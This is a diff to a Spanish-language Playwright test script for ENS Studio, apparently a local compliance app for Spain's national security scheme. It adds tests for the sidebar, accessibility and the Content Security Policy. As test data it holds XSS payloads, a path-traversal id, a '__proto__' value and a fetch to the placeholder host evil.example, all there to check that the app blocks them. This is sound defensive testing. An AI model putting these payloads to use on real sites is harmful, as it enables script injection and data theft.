@@ -25,6 +25,16 @@ def ok(cond, msg):
     print(("  ✔ " if cond else "  ✘ ") + msg)
 
 
+def wait_js(page, expr, timeout=15000):
+    """Espera a que una expresión sea verdadera sin wait_for_function: este evalúa con new Function,
+    que la CSP de la app bloquea en algunas versiones de Playwright."""
+    for _ in range(timeout // 100):
+        if page.evaluate(expr):
+            return True
+        page.wait_for_timeout(100)
+    raise TimeoutError(expr)
+
+
 def offline(page):
     page.route("**/*", lambda r: r.abort() if r.request.url.startswith("http") else r.continue_())
 
@@ -34,18 +44,21 @@ VIEWS = ["panel", "categorizacion", "riesgos", "soa", "compensatorias", "hallazg
 with sync_playwright() as p:
     b = p.chromium.launch()
     ctx = b.new_context(viewport={"width": 1440, "height": 900}, accept_downloads=True)
+    ctx.add_init_script("window.__csp = []; document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI))")
     page = ctx.new_page(); offline(page)
     errors = []
     page.on("pageerror", lambda e: errors.append(str(e)))
     page.on("console", lambda m: errors.append(m.text) if m.type == "error" and "net::" not in m.text and "Content Security Policy" not in m.text else None)
     page.on("dialog", lambda d: (errors.append("dialog: " + d.message), d.dismiss()))
-    page.goto(APP.as_uri()); page.wait_for_selector("#view h1")
+    page.goto(APP.as_uri() + "?test"); page.wait_for_selector("#view h1")
     J = lambda js: page.evaluate(js)
     audit = lambda: J("window.__ENS_STUDIO__.audit.map(f => f.id + '|' + f.ambito)")
     nav = lambda v: page.click(f'nav [data-view="{v}"]')
 
     print("Primera ejecución")
     ok(page.locator(".case-card").count() == 5, "Inicio muestra los 5 casos de ejemplo")
+    locked = J("[...document.querySelectorAll('nav [data-locked]')].map(e => e.getAttribute('aria-describedby'))")
+    ok(len(locked) >= 8 and all(x == "nav-note" for x in locked), f"Sin proyecto: {len(locked)} vistas con candado y explicación accesible")
     ok(J("Object.isFrozen(Object.prototype)"), "Object.prototype congelado (defensa ante prototype pollution)")
     page.fill("#ob-nombre", "Yoandy Ramírez Delgado"); page.locator("#ob-nombre").blur()
     page.select_option("#ob-rol", "Consultor/a GRC"); page.click('[data-act="ob-save"]')
@@ -153,7 +166,7 @@ with sync_playwright() as p:
     page.click('[data-act="menu"]')
     with page.expect_file_chooser() as fc:
         page.click('.menu [data-act="import-xlsx"]')
-    fc.value.set_files(str(ROOT / "data" / "SoA_TechServ_original.xlsx")); page.wait_for_function("window.__ENS_STUDIO__.state && window.__ENS_STUDIO__.state.categorizacion.length === 8", timeout=15000)
+    fc.value.set_files(str(ROOT / "data" / "SoA_TechServ_original.xlsx")); wait_js(page, "window.__ENS_STUDIO__.state && window.__ENS_STUDIO__.state.categorizacion.length === 8")
     c = J("window.__ENS_STUDIO__.calc")
     ok(c["categoria"] == "ALTA" and c["kpi"]["aplicables"] == 72 and c["kpi"]["implantadas"] == 66, "Importada: ALTA, 72 exigidas, 66 implantadas")
     ok(sum(1 for x in audit() if x.startswith("CAT-01")) == 0 and J("window.__ENS_STUDIO__.calc.niveles.D") == "ALTO" and len(J("window.__ENS_STUDIO__.state.compensatorias")) == 4, "m cuenta como MEDIO, la disponibilidad sigue en ALTO e importa las 4 compensatorias")
@@ -218,7 +231,15 @@ with sync_playwright() as p:
     ws_evil = {"profile": {"nombre": payload, "color": '"><img src=x onerror=alert(1)>'}, "settings": {"tema": payload, "acento": '" onload="x', "cvss": {"ma": "NaN"}, "reglasOff": ["<b>"]}, "projects": [{"id": "../../etc", "nombre": "x"}], "activeId": "__proto__"}
     J(f"localStorage.setItem('ens-studio/v2/ws', {json.dumps(json.dumps(ws_evil))})")
     page.reload(); page.wait_for_selector("#view h1")
-    ok(J("document.documentElement.getAttribute('data-accent')") == "teal" and J("window.__ENS_STUDIO__.ws.projects.length") == 0 and J("window.__pwned") is None, "Espacio de trabajo manipulado: se sanea al cargar")
+    ok(J("document.documentElement.getAttribute('data-accent')") == "blue" and J("window.__ENS_STUDIO__.ws.projects.length") == 0 and J("window.__pwned") is None, "Espacio de trabajo manipulado: se sanea al cargar")
+    ws_date = {"projects": [{"id": "p-fecha1", "nombre": "Fecha", "updated": '<b id="inj">x</b>'}], "profileDone": True, "onboarded": True}
+    J(f"localStorage.setItem('ens-studio/v2/ws', {json.dumps(json.dumps(ws_date))})")
+    page.reload(); page.wait_for_selector("#view h1"); J("window.__ENS_STUDIO__.go('inicio')")
+    ok(J("document.getElementById('inj')") is None and J("window.__ENS_STUDIO__.ws.projects[0].updated") == "", "Una fecha manipulada en el almacenamiento no inyecta HTML")
+    page2 = ctx.new_page(); offline(page2); page2.goto(APP.as_uri()); page2.wait_for_selector("#view h1")
+    ok(page2.evaluate("typeof window.__ENS_STUDIO__") == "undefined", "Sin ?test la app no expone su estado en window")
+    page2.close()
+    J(f"localStorage.setItem('ens-studio/v2/ws', {json.dumps(json.dumps(ws_evil))})"); page.reload(); page.wait_for_selector("#view h1")
     big = OUT / "grande.csv"; big.write_bytes(b"a" * (6 * 1024 * 1024))
     page.click('[data-act="open-case"][data-case="saas"]'); nav("hallazgos")
     with page.expect_file_chooser() as fc:
@@ -240,6 +261,44 @@ with sync_playwright() as p:
         page.click('[data-act="restore"]')
     fc.value.set_files(str(bk)); page.wait_for_timeout(400)
     ok(J("window.__ENS_STUDIO__.ws.projects.length") == n_proj and n_proj > 0, f"Restaurar la copia recupera {n_proj} proyectos")
+
+    print("Barra lateral (rail)")
+    J("window.__ENS_STUDIO__.openCase('techserv')"); page.mouse.move(1300, 500)
+    side_w = lambda: J("Math.round(document.querySelector('#side').getBoundingClientRect().width)")
+    pad = lambda: J("Math.round(parseFloat(getComputedStyle(document.querySelector('.app')).paddingLeft))")
+    settle = lambda: page.wait_for_timeout(600)
+    settle(); ok(side_w() == 264 and pad() == 264, f"1440 px: barra completa de 264 px y contenido a continuación ({side_w()}/{pad()})")
+    page.click("#view h1"); page.keyboard.press("["); settle()
+    ok(J("document.documentElement.hasAttribute('data-mini')") and side_w() == 76 and pad() == 76, f"«[» pliega la barra a 76 px ({side_w()}/{pad()})")
+    ok(J("window.__ENS_STUDIO__.ws.settings.railMin === true && Object.values(localStorage).some(v => v.includes('\"railMin\":true'))"), "La preferencia de barra plegada se guarda")
+    icon_x = J("Math.round(document.querySelector('nav [data-view=\"soa\"] svg').getBoundingClientRect().left)")
+    page.hover('nav [data-view="soa"]'); settle()
+    ok(side_w() == 264 and pad() == 76, f"Al pasar el ratón se despliega por encima sin mover el contenido ({side_w()}/{pad()})")
+    ok(J("Math.round(document.querySelector('nav [data-view=\"soa\"] svg').getBoundingClientRect().left)") == icon_x, "Los iconos no se mueven al desplegar")
+    ok(J("document.querySelector('nav').classList.contains('hov')"), "El resalte sigue al puntero")
+    page.mouse.move(1300, 500); settle(); ok(side_w() == 76, "Al salir vuelve a plegarse")
+    J("document.querySelector('[data-act=\"rail-toggle\"]').click()"); page.mouse.move(1300, 500); settle()
+    ok(side_w() == 264 and not J("window.__ENS_STUDIO__.ws.settings.railMin"), "El botón la vuelve a desplegar")
+    page.set_viewport_size({"width": 1100, "height": 900}); settle()
+    ok(side_w() == 76 and pad() == 76, f"1100 px: compacta automática ({side_w()}/{pad()})")
+    page.keyboard.press("Escape"); J("document.activeElement && document.activeElement.blur()")
+    J("document.querySelector('nav [data-view=\"plan\"]').focus({focusVisible: true})"); page.keyboard.press("Tab"); page.keyboard.press("Shift+Tab"); settle()
+    ok(J("document.querySelector('#side').classList.contains('kb')") and side_w() == 264, "Con el teclado la barra compacta se despliega")
+    page.mouse.move(1000, 500); J("document.activeElement.blur()"); page.set_viewport_size({"width": 1440, "height": 900}); settle()
+    J("window.__ENS_STUDIO__.openCase('techserv')")
+
+    print("Seguridad: CSP")
+    csp = J("document.querySelector('meta[http-equiv=\"Content-Security-Policy\"]').content")
+    ok("unsafe-inline" not in csp.split("script-src")[1].split(";")[0] and "default-src 'none'" in csp and "connect-src 'none'" in csp, "CSP por hashes: sin 'unsafe-inline' en script-src y sin conexiones salientes")
+    ok("googleapis" not in csp and "gstatic" not in csp, "Sin Google Fonts: tipografía del sistema")
+    ok(J("window.__csp.length") == 0, f"Ninguna violación de CSP durante el uso normal: {J('window.__csp.slice(0, 3)')}")
+    r = page.evaluate("""async () => { const d = document.createElement('div'); d.innerHTML = '<img src=x onerror="window.__pwn=1">'; document.body.append(d);
+      const s = document.createElement('script'); s.textContent = 'window.__pwn2 = 1'; document.body.append(s);
+      let f = 'bloqueado'; try { await fetch('https://evil.example/x'); f = 'salió'; } catch (e) {}
+      await new Promise(r => setTimeout(r, 200)); d.remove(); s.remove(); return [window.__pwn, window.__pwn2, f]; }""")
+    ok(r == [None, None, "bloqueado"], f"La CSP bloquea manejadores inyectados, scripts nuevos y fetch: {r}")
+    ok(J("window.__csp.length") >= 3, "La CSP registra las violaciones bloqueadas")
+    ok(J("typeof window.XLSX") == "undefined", "Las librerías de Excel no quedan en el objeto global")
 
     print("Responsive")
     for w in (390, 768):
